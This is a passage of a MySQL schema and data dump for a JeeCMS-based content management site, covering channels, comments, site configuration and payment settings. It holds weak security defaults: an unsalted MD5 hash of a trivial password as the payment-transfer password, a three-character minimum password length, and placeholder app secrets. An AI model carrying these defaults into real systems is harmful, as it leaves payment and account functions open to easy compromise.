INSERT INTO `jc_channel_count` VALUES ('75', '452', '135', '4', '2', '6', '0', '0', '3', '3'), ('76', '210', '25', '0', '0', '13', '0', '0', '13', '13'), ('77', '38', '24', '0', '0', '0', '0', '0', '0', '0'), ('78', '25', '5', '0', '0', '6', '4', '4', '6', '6'), ('79', '49', '19', '0', '0', '0', '0', '0', '0', '0'), ('80', '33', '6', '0', '0', '0', '0', '0', '0', '0'), ('81', '72', '31', '0', '0', '0', '0', '0', '0', '0'), ('82', '6', '0', '0', '0', '0', '0', '0', '0', '0'), ('90', '12', '1', '0', '0', '0', '0', '0', '0', '0'), ('91', '2', '2', '0', '0', '0', '0', '0', '0', '0'), ('92', '14', '9', '1', '0', '6', '4', '4', '6', '6'), ('93', '2', '0', '0', '0', '0', '0', '0', '0', '0'), ('94', '3', '3', '3', '0', '13', '13', '13', '13', '13'), ('95', '3', '3', '3', '2', '10', '0', '10', '10', '10'), ('96', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('97', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('98', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('99', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('100', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('101', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('102', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('103', '0', '0', '0', '0', '0', '0', '0', '0', '0'), ('104', '5', '5', '5', '1', '3', '0', '0', '3', '3');
COMMIT;

-- ----------------------------
--  Table structure for `jc_channel_depart_control`
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_depart_control`;
CREATE TABLE `jc_channel_depart_control` (
  `channel_id` int(11) NOT NULL,
  `department_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`,`department_id`),
  KEY `fk_jc_channel_department` (`department_id`),
  CONSTRAINT `fk_jc_channel_depart_control` FOREIGN KEY (`department_id`) REFERENCES `jc_department` (`depart_id`),
  CONSTRAINT `fk_jc_depart_control_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS部门栏目数据权限关联表';

-- ----------------------------
--  Records of `jc_channel_depart_control`
-- ----------------------------
BEGIN;
INSERT INTO `jc_channel_depart_control` VALUES ('75', '2'), ('76', '2'), ('77', '2'), ('78', '2'), ('79', '2'), ('80', '2'), ('81', '2'), ('82', '2'), ('90', '2'), ('91', '2'), ('92', '2'), ('93', '2'), ('94', '2'), ('95', '2'), ('96', '2'), ('97', '2'), ('98', '2'), ('99', '2'), ('100', '2'), ('101', '2'), ('102', '2'), ('103', '2');
COMMIT;

-- ----------------------------
--  Table structure for `jc_channel_department`
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_department`;
CREATE TABLE `jc_channel_department` (
  `channel_id` int(11) NOT NULL,
  `department_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`,`department_id`),
  KEY `fk_jc_channel_department` (`department_id`),
  CONSTRAINT `fk_jc_channel_department` FOREIGN KEY (`department_id`) REFERENCES `jc_department` (`depart_id`),
  CONSTRAINT `fk_jc_department_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目部门关联表';

-- ----------------------------
--  Records of `jc_channel_department`
-- ----------------------------
BEGIN;
INSERT INTO `jc_channel_department` VALUES ('75', '2'), ('76', '2'), ('77', '2'), ('78', '2'), ('79', '2'), ('80', '2'), ('81', '2'), ('82', '2'), ('90', '2'), ('91', '2'), ('92', '2'), ('93', '2'), ('94', '2'), ('95', '2'), ('96', '2'), ('97', '2'), ('98', '2'), ('99', '2'), ('100', '2'), ('101', '2'), ('102', '2'), ('103', '2');
COMMIT;

-- ----------------------------
--  Table structure for `jc_channel_ext`
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_ext`;
CREATE TABLE `jc_channel_ext` (
  `channel_id` int(11) NOT NULL,
  `channel_name` varchar(100) NOT NULL COMMENT '名称',
  `final_step` tinyint(4) DEFAULT '2' COMMENT '终审级别',
  `after_check` tinyint(4) DEFAULT NULL COMMENT '审核后(1:不能修改删除;2:修改后退回;3:修改后不变)',
  `is_static_channel` char(1) NOT NULL DEFAULT '0' COMMENT '是否栏目静态化',
  `is_static_content` char(1) NOT NULL DEFAULT '0' COMMENT '是否内容静态化',
  `is_access_by_dir` char(1) NOT NULL DEFAULT '1' COMMENT '是否使用目录访问',
  `is_list_child` char(1) NOT NULL DEFAULT '0' COMMENT '是否使用子栏目列表',
  `page_size` int(11) NOT NULL DEFAULT '20' COMMENT '每页多少条记录',
  `channel_rule` varchar(150) DEFAULT NULL COMMENT '栏目页生成规则',
  `content_rule` varchar(150) DEFAULT NULL COMMENT '内容页生成规则',
  `link` varchar(255) DEFAULT NULL COMMENT '外部链接',
  `tpl_channel` varchar(100) DEFAULT NULL COMMENT '栏目页模板',
  `tpl_content` varchar(100) DEFAULT NULL COMMENT '内容页模板',
  `title_img` varchar(100) DEFAULT NULL COMMENT '缩略图',
  `content_img` varchar(100) DEFAULT NULL COMMENT '内容图',
  `has_title_img` tinyint(1) NOT NULL DEFAULT '0' COMMENT '内容是否有缩略图',
  `has_content_img` tinyint(1) NOT NULL DEFAULT '0' COMMENT '内容是否有内容图',
  `title_img_width` int(11) NOT NULL DEFAULT '139' COMMENT '内容标题图宽度',
  `title_img_height` int(11) NOT NULL DEFAULT '139' COMMENT '内容标题图高度',
  `content_img_width` int(11) NOT NULL DEFAULT '310' COMMENT '内容内容图宽度',
  `content_img_height` int(11) NOT NULL DEFAULT '310' COMMENT '内容内容图高度',
  `comment_control` int(11) NOT NULL DEFAULT '0' COMMENT '评论(0:匿名;1:会员一次;2:关闭,3会员多次)',
  `allow_updown` tinyint(1) NOT NULL DEFAULT '1' COMMENT '顶踩(true:开放;false:关闭)',
  `is_blank` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否新窗口打开',
  `title` varchar(255) DEFAULT NULL COMMENT 'TITLE',
  `keywords` varchar(255) DEFAULT NULL COMMENT 'KEYWORDS',
  `description` varchar(255) DEFAULT NULL COMMENT 'DESCRIPTION',
  `allow_share` tinyint(1) NOT NULL DEFAULT '0' COMMENT '分享(true:开放;false:关闭)',
  `allow_score` tinyint(1) NOT NULL DEFAULT '0' COMMENT '评分(true:开放;false:关闭)',
  `tpl_mobile_channel` varchar(100) DEFAULT NULL COMMENT '手机栏目页模板',
  PRIMARY KEY (`channel_id`),
  CONSTRAINT `fk_jc_ext_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目内容表';

-- ----------------------------
--  Records of `jc_channel_ext`
-- ----------------------------
BEGIN;
INSERT INTO `jc_channel_ext` VALUES ('75', '工作动态', null, null, '0', '0', '0', '0', '10', null, null, null, '/WEB-INF/t/cms/www/default/channel/news.html', null, null, null, '0', '0', '510', '288', '310', '310', '0', '1', '0', null, null, null, '1', '1', '/WEB-INF/t/cms/www/mobile/channel/news.html'), ('76', '图片新闻_无用', null, null, '0', '0', '0', '0', '10', null, null, null, '/WEB-INF/t/cms/www/default/channel/news.html', null, null, null, '0', '0', '510', '288', '310', '310', '0', '1', '0', null, null, null, '0', '0', '/WEB-INF/t/cms/www/mobile/channel/news.html'), ('77', '视频', null, null, '0', '0', '0', '0', '10', null, null, null, null, null, null, null, '1', '0', '510', '288', '310', '310', '0', '1', '0', null, null, null, '0', '0', ''), ('78', '下载', null, null, '0', '0', '0', '0', '10', null, null, null, null, null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', ''), ('79', '招聘', null, null, '0', '0', '0', '0', '10', null, null, null, null, null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', ''), ('80', '网络调查', null, null, '0', '0', '0', '0', '10', null, null, null, '/WEB-INF/t/cms/www/default/alone/alone_survey.html', null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', '/WEB-INF/t/cms/www/mobile/alone/alone_survey.html.html'), ('81', '文库', null, null, '0', '0', '0', '0', '10', null, null, null, null, null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', ''), ('82', '留言板', null, null, '0', '0', '0', '0', '10', null, null, '/guestbook.jspx', null, null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', ''), ('90', '系统软件', null, null, '0', '0', '0', '0', '10', null, null, null, '/WEB-INF/t/cms/www/default/channel/download_child.html', null, null, null, '1', '1', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', ''), ('91', '媒体助手', null, null, '0', '0', '0', '0', '10', null, null, null, '/WEB-INF/t/cms/www/default/channel/download_child.html', null, null, null, '1', '1', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', ''), ('92', '精品推荐', null, null, '0', '0', '0', '0', '10', null, null, null, '/WEB-INF/t/cms/www/default/channel/download_recommend.html', null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', ''), ('93', '游戏娱乐', null, null, '0', '0', '0', '0', '10', null, null, null, '/WEB-INF/t/cms/www/default/channel/download_child.html', null, null, null, '1', '1', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', ''), ('94', '公告通知', null, null, '0', '0', '0', '0', '10', null, null, null, null, null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', ''), ('95', '综合文档', null, null, '0', '0', '0', '0', '10', null, null, null, null, null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', ''), ('96', '软件中心', null, null, '0', '0', '0', '0', '10', null, null, null, null, null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', ''), ('97', '党团工作', null, null, '0', '0', '0', '0', '10', null, null, null, null, null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', ''), ('98', '审计检查', null, null, '0', '0', '0', '0', '10', null, null, null, null, null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', ''), ('99', '培训管理', null, null, '0', '0', '0', '0', '10', null, null, null, null, null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', ''), ('100', '科技成果', null, null, '0', '0', '0', '0', '10', null, null, null, null, null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', ''), ('101', '考核数据', null, null, '0', '0', '0', '0', '10', null, null, null, null, null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', ''), ('102', '项目管理', null, null, '0', '0', '0', '0', '10', null, null, null, null, null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', ''), ('103', '运维管理', null, null, '0', '0', '0', '0', '10', null, null, null, null, null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', ''), ('104', '图片新闻', null, null, '0', '0', '0', '0', '10', null, null, null, null, null, null, null, '0', '0', '139', '139', '310', '310', '0', '1', '0', null, null, null, '0', '0', '');
COMMIT;

-- ----------------------------
--  Table structure for `jc_channel_model`
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_model`;
CREATE TABLE `jc_channel_model` (
  `channel_id` int(11) NOT NULL,
  `model_id` int(11) NOT NULL COMMENT '模型id',
  `tpl_content` varchar(100) DEFAULT NULL COMMENT '内容模板',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排序',
  `tpl_mobile_content` varchar(100) DEFAULT NULL COMMENT '手机内容页模板',
  PRIMARY KEY (`channel_id`,`priority`),
  KEY `fk_jc_model_channel_m` (`model_id`),
  CONSTRAINT `fk_jc_channel_model_c` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`),
  CONSTRAINT `fk_jc_model_channel_m` FOREIGN KEY (`model_id`) REFERENCES `jc_model` (`model_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='栏目可选内容模型表';

-- ----------------------------
--  Records of `jc_channel_model`
-- ----------------------------
BEGIN;
INSERT INTO `jc_channel_model` VALUES ('75', '1', '/WEB-INF/t/cms/www/default/content/news2.html', '0', '/WEB-INF/t/cms/www/mobile/content/news.html'), ('76', '5', '', '0', ''), ('77', '6', '', '0', ''), ('79', '8', '', '0', ''), ('81', '9', '/WEB-INF/t/cms/www/default/content/doc_pdfjs.html', '0', ''), ('90', '4', '', '0', ''), ('91', '4', '', '0', ''), ('92', '4', '', '0', ''), ('93', '4', '', '0', '');
COMMIT;

-- ----------------------------
--  Table structure for `jc_channel_txt`
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_txt`;
CREATE TABLE `jc_channel_txt` (
  `channel_id` int(11) NOT NULL,
  `txt` longtext COMMENT '栏目内容',
  `txt1` longtext COMMENT '扩展内容1',
  `txt2` longtext COMMENT '扩展内容2',
  `txt3` longtext COMMENT '扩展内容3',
  PRIMARY KEY (`channel_id`),
  CONSTRAINT `fk_jc_txt_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目文本表';

-- ----------------------------
--  Table structure for `jc_channel_user`
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_user`;
CREATE TABLE `jc_channel_user` (
  `channel_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`,`user_id`),
  KEY `fk_jc_channel_user` (`user_id`),
  CONSTRAINT `fk_jc_channel_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_user_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目用户关联表';

-- ----------------------------
--  Table structure for `jc_chnl_group_contri`
-- ----------------------------
DROP TABLE IF EXISTS `jc_chnl_group_contri`;
CREATE TABLE `jc_chnl_group_contri` (
  `channel_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`,`group_id`),
  KEY `fk_jc_channel_group_c` (`group_id`),
  CONSTRAINT `fk_jc_channel_group_c` FOREIGN KEY (`group_id`) REFERENCES `jc_group` (`group_id`),
  CONSTRAINT `fk_jc_group_channel_c` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目投稿会员组关联表';

-- ----------------------------
--  Records of `jc_chnl_group_contri`
-- ----------------------------
BEGIN;
INSERT INTO `jc_chnl_group_contri` VALUES ('95', '1'), ('97', '1'), ('98', '1'), ('99', '1'), ('100', '1'), ('101', '1'), ('102', '1'), ('103', '1'), ('104', '1'), ('75', '2'), ('76', '2'), ('77', '2'), ('79', '2'), ('81', '2'), ('94', '2'), ('95', '2'), ('96', '2'), ('97', '2'), ('98', '2'), ('99', '2'), ('100', '2'), ('101', '2'), ('102', '2'), ('103', '2'), ('104', '2'), ('75', '3'), ('76', '3'), ('77', '3'), ('79', '3'), ('81', '3'), ('94', '3'), ('95', '3'), ('96', '3'), ('97', '3'), ('98', '3'), ('99', '3'), ('100', '3'), ('101', '3'), ('102', '3'), ('103', '3'), ('104', '3');
COMMIT;

-- ----------------------------
--  Table structure for `jc_chnl_group_view`
-- ----------------------------
DROP TABLE IF EXISTS `jc_chnl_group_view`;
CREATE TABLE `jc_chnl_group_view` (
  `channel_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`,`group_id`),
  KEY `fk_jc_channel_group_v` (`group_id`),
  CONSTRAINT `fk_jc_channel_group_v` FOREIGN KEY (`group_id`) REFERENCES `jc_group` (`group_id`),
  CONSTRAINT `fk_jc_group_channel_v` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目浏览会员组关联表';

-- ----------------------------
--  Table structure for `jc_comment`
-- ----------------------------
DROP TABLE IF EXISTS `jc_comment`;
CREATE TABLE `jc_comment` (
  `comment_id` int(11) NOT NULL AUTO_INCREMENT,
  `comment_user_id` int(11) DEFAULT NULL COMMENT '评论用户ID',
  `reply_user_id` int(11) DEFAULT NULL COMMENT '回复用户ID',
  `content_id` int(11) NOT NULL COMMENT '内容ID',
  `site_id` int(11) NOT NULL COMMENT '站点ID',
  `create_time` datetime NOT NULL COMMENT '评论时间',
  `reply_time` datetime DEFAULT NULL COMMENT '回复时间',
  `ups` smallint(6) NOT NULL DEFAULT '0' COMMENT '支持数',
  `downs` smallint(6) NOT NULL DEFAULT '0' COMMENT '反对数',
  `is_recommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否推荐',
  `is_checked` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否审核',
  `score` int(11) DEFAULT NULL COMMENT '评分',
  `parent_id` int(11) DEFAULT NULL COMMENT '父级评论',
  `reply_count` int(11) DEFAULT '0' COMMENT '回复数',
  PRIMARY KEY (`comment_id`),
  KEY `fk_jc_comment_content` (`content_id`),
  KEY `fk_jc_comment_reply` (`reply_user_id`),
  KEY `fk_jc_comment_site` (`site_id`),
  KEY `fk_jc_comment_user` (`comment_user_id`),
  CONSTRAINT `fk_jc_comment_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`),
  CONSTRAINT `fk_jc_comment_reply` FOREIGN KEY (`reply_user_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_comment_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_comment_user` FOREIGN KEY (`comment_user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS评论表';

-- ----------------------------
--  Table structure for `jc_comment_ext`
-- ----------------------------
DROP TABLE IF EXISTS `jc_comment_ext`;
CREATE TABLE `jc_comment_ext` (
  `comment_id` int(11) NOT NULL,
  `ip` varchar(50) DEFAULT NULL COMMENT 'IP地址',
  `text` longtext COMMENT '评论内容',
  `reply` longtext COMMENT '回复内容',
  KEY `fk_jc_ext_comment` (`comment_id`),
  CONSTRAINT `fk_jc_ext_comment` FOREIGN KEY (`comment_id`) REFERENCES `jc_comment` (`comment_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS评论扩展表';

-- ----------------------------
--  Table structure for `jc_config`
-- ----------------------------
DROP TABLE IF EXISTS `jc_config`;
CREATE TABLE `jc_config` (
  `config_id` int(11) NOT NULL,
  `context_path` varchar(20) DEFAULT '/JeeCms' COMMENT '部署路径',
  `servlet_point` varchar(20) DEFAULT NULL COMMENT 'Servlet挂载点',
  `port` int(11) DEFAULT NULL COMMENT '端口',
  `db_file_uri` varchar(50) NOT NULL DEFAULT '/dbfile.svl?n=' COMMENT '数据库附件访问地址',
  `is_upload_to_db` tinyint(1) NOT NULL DEFAULT '0' COMMENT '上传附件至数据库',
  `def_img` varchar(255) NOT NULL DEFAULT '/JeeCms/r/cms/www/default/no_picture.gif' COMMENT '图片不存在时默认图片',
  `login_url` varchar(255) NOT NULL DEFAULT '/login.jspx' COMMENT '登录地址',
  `process_url` varchar(255) DEFAULT NULL COMMENT '登录后处理地址',
  `mark_on` tinyint(1) NOT NULL DEFAULT '1' COMMENT '开启图片水印',
  `mark_width` int(11) NOT NULL DEFAULT '120' COMMENT '图片最小宽度',
  `mark_height` int(11) NOT NULL DEFAULT '120' COMMENT '图片最小高度',
  `mark_image` varchar(100) DEFAULT '/r/cms/www/watermark.png' COMMENT '图片水印',
  `mark_content` varchar(100) NOT NULL DEFAULT 'www.honghe.com' COMMENT '文字水印内容',
  `mark_size` int(11) NOT NULL DEFAULT '20' COMMENT '文字水印大小',
  `mark_color` varchar(10) NOT NULL DEFAULT '#FF0000' COMMENT '文字水印颜色',
  `mark_alpha` int(11) NOT NULL DEFAULT '50' COMMENT '水印透明度（0-100）',
  `mark_position` int(11) NOT NULL DEFAULT '1' COMMENT '水印位置(0-5)',
  `mark_offset_x` int(11) NOT NULL DEFAULT '0' COMMENT 'x坐标偏移量',
  `mark_offset_y` int(11) NOT NULL DEFAULT '0' COMMENT 'y坐标偏移量',
  `count_clear_time` date NOT NULL COMMENT '计数器清除时间',
  `count_copy_time` datetime NOT NULL COMMENT '计数器拷贝时间',
  `download_code` varchar(32) NOT NULL DEFAULT 'jeecms' COMMENT '下载防盗链md5混淆码',
  `download_time` int(11) NOT NULL DEFAULT '12' COMMENT '下载有效时间（小时）',
  `email_host` varchar(50) DEFAULT NULL COMMENT '邮件发送服务器',
  `email_encoding` varchar(20) DEFAULT NULL COMMENT '邮件发送编码',
  `email_username` varchar(100) DEFAULT NULL COMMENT '邮箱用户名',
  `email_password` varchar(100) DEFAULT NULL COMMENT '邮箱密码',
  `email_personal` varchar(100) DEFAULT NULL COMMENT '邮箱发件人',
  `email_validate` tinyint(1) DEFAULT '0' COMMENT '开启邮箱验证',
  `office_home` varchar(255) NOT NULL COMMENT 'openoffice安装目录',
  `office_port` varchar(10) NOT NULL DEFAULT '8810' COMMENT 'openoffice端口',
  `swftools_home` varchar(255) NOT NULL COMMENT 'swftoos安装目录',
  `view_only_checked` tinyint(1) NOT NULL DEFAULT '0' COMMENT '只有终审才能浏览内容页',
  `inside_site` tinyint(1) NOT NULL DEFAULT '0' COMMENT '内网（通过站点路径区分站点）',
  `flow_clear_time` date NOT NULL COMMENT '流量统计清除时间',
  `channel_count_clear_time` date NOT NULL COMMENT '栏目发布内容计数器清除时间',
  PRIMARY KEY (`config_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS配置表';

-- ----------------------------
--  Records of `jc_config`
-- ----------------------------
BEGIN;
INSERT INTO `jc_config` VALUES ('1', '/honghe', null, '8888', '/dbfile.svl?n=', '0', '/r/cms/www/no_picture.gif', '/login.jspx', null, '0', '120', '120', '/r/cms/www/watermark.png', '科技综合管理系统', '40', '#FF0000', '100', '1', '0', '0', '2018-10-23', '2018-10-23 18:25:32', 'jeecms', '12', null, null, null, null, null, '0', '/opt/openoffice4', '8820', 'D:/SWFTools/pdf2swf.exe', '0', '0', '2018-10-23', '2018-10-22');
COMMIT;

-- ----------------------------
--  Table structure for `jc_config_attr`
-- ----------------------------
DROP TABLE IF EXISTS `jc_config_attr`;
CREATE TABLE `jc_config_attr` (
  `config_id` int(11) NOT NULL,
  `attr_name` varchar(30) NOT NULL COMMENT '名称',
  `attr_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_attr_config` (`config_id`),
  CONSTRAINT `fk_jc_attr_config` FOREIGN KEY (`config_id`) REFERENCES `jc_config` (`config_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS配置属性表';

-- ----------------------------
--  Records of `jc_config_attr`
-- ----------------------------
BEGIN;
INSERT INTO `jc_config_attr` VALUES ('1', 'password_min_len', '3'), ('1', 'username_reserved', ''), ('1', 'register_on', 'true'), ('1', 'member_on', 'true'), ('1', 'username_min_len', '5'), ('1', 'version', 'jeecms-v8'), ('1', 'user_img_height', '98'), ('1', 'user_img_width', '143'), ('1', 'check_on', 'false'), ('1', 'new_picture', '/r/cms/www/new.gif'), ('1', 'day', '3'), ('1', 'preview', 'false'), ('1', 'qqEnable', 'false'), ('1', 'sinaKey', ''), ('1', 'sinaEnable', 'false'), ('1', 'qqID', '101139646'), ('1', 'qqKey', ''), ('1', 'sinaID', '2510334929'), ('1', 'qqWeboEnable', 'false'), ('1', 'qqWeboKey', ''), ('1', 'qqWeboID', '801526383'), ('1', 'ssoEnable', 'false'), ('1', 'flowSwitch', 'true'), ('1', 'contentFreshMinute', '0'), ('1', 'codeImgWidth', '160'), ('1', 'codeImgHeight', '160'), ('1', 'reward_fix_4', '4'), ('1', 'reward_fix_1', '1'), ('1', 'reward_fix_3', '3'), ('1', 'reward_fix_2', '2'), ('1', 'reward_fix_5', '5'), ('1', 'reward_fix_6', '6'), ('1', 'weixinAppId', '1212'), ('1', 'weixinAppSecret', '121212'), ('1', 'weixinLoginId', '1212'), ('1', 'weixinLoginSecret', '121212');
COMMIT;

-- ----------------------------
--  Table structure for `jc_config_content_charge`
-- ----------------------------
DROP TABLE IF EXISTS `jc_config_content_charge`;
CREATE TABLE `jc_config_content_charge` (
  `config_content_id` int(11) NOT NULL DEFAULT '1',
  `weixin_appid` varchar(255) NOT NULL DEFAULT '' COMMENT '微信服务号APPID',
  `weixin_secret` varchar(50) NOT NULL DEFAULT '' COMMENT '微信公众号secret',
  `weixin_account` varchar(255) NOT NULL DEFAULT '' COMMENT '微信支付商户号',
  `weixin_password` varchar(255) NOT NULL DEFAULT '' COMMENT '微信支付商户密钥',
  `alipay_partner_id` varchar(255) DEFAULT NULL COMMENT '支付宝合作者ID',
  `alipay_account` varchar(255) DEFAULT NULL COMMENT '支付宝签约账户',
  `alipay_key` varchar(1000) DEFAULT NULL COMMENT '支付宝公钥',
  `alipay_appid` varchar(255) DEFAULT NULL COMMENT '支付宝应用ID',
  `alipay_public_key` varchar(255) DEFAULT '' COMMENT '支付宝RSA公钥',
  `alipay_private_key` varchar(1000) DEFAULT NULL COMMENT '支付宝RSA私钥',
  `charge_ratio` double(5,2) NOT NULL DEFAULT '0.00' COMMENT '抽成比例',
  `min_draw_amount` double(11,2) NOT NULL DEFAULT '1.00' COMMENT '最小提现额',
  `commission_total` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '佣金抽成总金额',
  `commission_year` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '佣金抽成年金额',
  `commission_month` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '佣金抽成月金额',
  `commission_day` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '佣金抽成日金额',
  `last_buy_time` timestamp NULL DEFAULT NULL COMMENT '最后购买时间',
  `pay_transfer_password` varchar(100) NOT NULL DEFAULT '5f4dcc3b5aa765d61d8327deb882cf99' COMMENT '转账支付密码（管理后台验证）',
  `transfer_api_password` varchar(100) NOT NULL DEFAULT '' COMMENT '企业转账接口API密钥',
  `reward_min` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '打赏随机数最小值',
  `reward_max` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '打赏随机数最小值',
  `reward_pattern` tinyint(1) NOT NULL DEFAULT '0' COMMENT '打赏模式(0随机 1固定)',
  PRIMARY KEY (`config_content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='内容收费配置';

-- ----------------------------
--  Records of `jc_config_content_charge`
-- ----------------------------
BEGIN;
INSERT INTO `jc_config_content_charge` VALUES ('1', '1', '2', '3', '4', '1', '1', '1', '1', '1', '1', '0.10', '1.00', '0.0000', '0.0000', '0.0000', '0.0000', '2016-10-11 11:40:48', '5f4dcc3b5aa765d61d8327deb882cf99', '4', '0.01', '1.00', '0');
COMMIT;

-- ----------------------------
--  Table structure for `jc_config_item`
-- ----------------------------
DROP TABLE IF EXISTS `jc_config_item`;
CREATE TABLE `jc_config_item` (
  `modelitem_id` int(11) NOT NULL AUTO_INCREMENT,
  `config_id` int(11) NOT NULL,
  `field` varchar(50) NOT NULL COMMENT '字段',
  `item_label` varchar(100) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '70' COMMENT '排列顺序',
  `def_value` varchar(255) DEFAULT NULL COMMENT '默认值',
  `opt_value` varchar(255) DEFAULT NULL COMMENT '可选项',
  `text_size` varchar(20) DEFAULT NULL COMMENT '长度',
  `area_rows` varchar(3) DEFAULT NULL COMMENT '文本行数',
  `area_cols` varchar(3) DEFAULT NULL COMMENT '文本列数',
  `help` varchar(255) DEFAULT NULL COMMENT '帮助信息',
  `help_position` varchar(1) DEFAULT NULL COMMENT '帮助位置',
  `data_type` int(11) NOT NULL DEFAULT '1' COMMENT '数据类型 "1":"字符串文本","2":"整型文本","3":"浮点型文本","4":"文本区","5":"日期","6":"下拉列表","7":"复选框","8":"单选框"',
  `is_required` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否必填',
  `category` int(11) NOT NULL DEFAULT '1' COMMENT '模型项目所属分类（1注册模型）',
  PRIMARY KEY (`modelitem_id`),
  KEY `fk_jc_item_config` (`config_id`),
  CONSTRAINT `fk_jc_item_config` FOREIGN KEY (`config_id`) REFERENCES `jc_config` (`config_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS配置模型项表';

-- ----------------------------
--  Table structure for `jc_content`
-- ----------------------------
DROP TABLE IF EXISTS `jc_content`;
CREATE TABLE `jc_content` (
  `content_id` int(11) NOT NULL AUTO_INCREMENT,
  `channel_id` int(11) NOT NULL COMMENT '栏目ID',
  `user_id` int(11) NOT NULL COMMENT '用户ID',
  `type_id` int(11) NOT NULL COMMENT '属性ID',
  `model_id` int(11) NOT NULL COMMENT '模型ID',
  `site_id` int(11) NOT NULL COMMENT '站点ID',
  `sort_date` datetime NOT NULL COMMENT '排序日期',
  `top_level` tinyint(4) NOT NULL DEFAULT '0' COMMENT '固顶级别',
  `has_title_img` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否有标题图',
  `is_recommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否推荐',
  `status` tinyint(4) NOT NULL DEFAULT '2' COMMENT '状态(0:草稿;1:审核中;2:审核通过;3:回收站;4:投稿;5:归档)',
